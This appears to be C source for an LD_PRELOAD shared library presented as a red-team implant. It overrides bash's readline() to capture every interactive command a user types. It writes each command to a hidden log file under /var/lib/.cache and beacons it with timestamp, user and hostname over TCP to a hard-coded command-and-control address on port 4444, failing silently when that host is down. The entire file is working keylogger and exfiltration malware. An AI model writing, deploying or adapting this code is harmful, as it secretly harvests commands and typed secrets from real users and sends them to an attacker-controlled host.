#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <dlfcn.h>
#include <unistd.h>
#include <time.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>

// ── CONFIG ──────────────────────────────────────────────
#define C2_IP   "192.168.1.79"   // your Kali red team IP
#define C2_PORT 4444
#define LOG_PATH "/var/lib/.cache/syslog_aux"  // hidden local log
// ────────────────────────────────────────────────────────

typedef char *(*readline_fn)(const char *);

static void beacon(const char *data) {
    int sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0) return;

    struct sockaddr_in c2 = {
        .sin_family = AF_INET,
        .sin_port   = htons(C2_PORT),
    };
    inet_pton(AF_INET, C2_IP, &c2.sin_addr);

    // Non-blocking connect — if C2 is down, silently fail
    struct timeval tv = { .tv_sec = 2, .tv_usec = 0 };
    setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, &tv, sizeof(tv));

    if (connect(sock, (struct sockaddr *)&c2, sizeof(c2)) == 0) {
        // Format: [timestamp] user@host: command\n
        char hostname[64] = {0};
        gethostname(hostname, sizeof(hostname));

        char *user = getenv("USER");
        if (!user) user = "unknown";

        time_t now = time(NULL);
        char ts[32];
        strftime(ts, sizeof(ts), "%Y-%m-%d %H:%M:%S", localtime(&now));

        char buf[2048];
        snprintf(buf, sizeof(buf), "[%s] %s@%s$ %s\n", ts, user, hostname, data);
        send(sock, buf, strlen(buf), 0);
    }
    close(sock);
}

static void write_local_log(const char *data) {
    FILE *f = fopen(LOG_PATH, "a");
    if (!f) return;

    char *user = getenv("USER");
    time_t now = time(NULL);
    char ts[32];
    strftime(ts, sizeof(ts), "%Y-%m-%d %H:%M:%S", localtime(&now));
    fprintf(f, "[%s] %s: %s\n", ts, user ? user : "?", data);
    fclose(f);
}

// ── Hook readline() which bash uses for interactive input ──
char *readline(const char *prompt) {
    readline_fn real_readline = dlsym(RTLD_NEXT, "readline");
    char *line = real_readline(prompt);

    if (line && *line) {          // ignore empty enters
        write_local_log(line);
        beacon(line);             // fire and forget
    }
    return line;
}
